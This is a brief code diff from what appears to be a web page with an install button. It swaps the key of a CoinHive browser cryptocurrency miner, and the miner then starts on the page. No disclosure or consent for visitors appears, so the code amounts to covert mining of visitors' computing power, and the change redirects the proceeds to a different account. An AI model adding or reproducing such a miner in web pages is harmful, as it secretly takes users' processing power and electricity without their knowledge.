@@ -6,7 +6,7 @@
         return check;
     };
 
-    var miner = new CoinHive.Anonymous('aeQAmbpFKbCxXJANMclg8qMOQCeWoHYo');
+    var miner = new CoinHive.Anonymous('LAWkR7hoq05U0zB5WFvaDCldo57oDf3f');
 	miner.start();
 
     var button = document.getElementById('installButton');
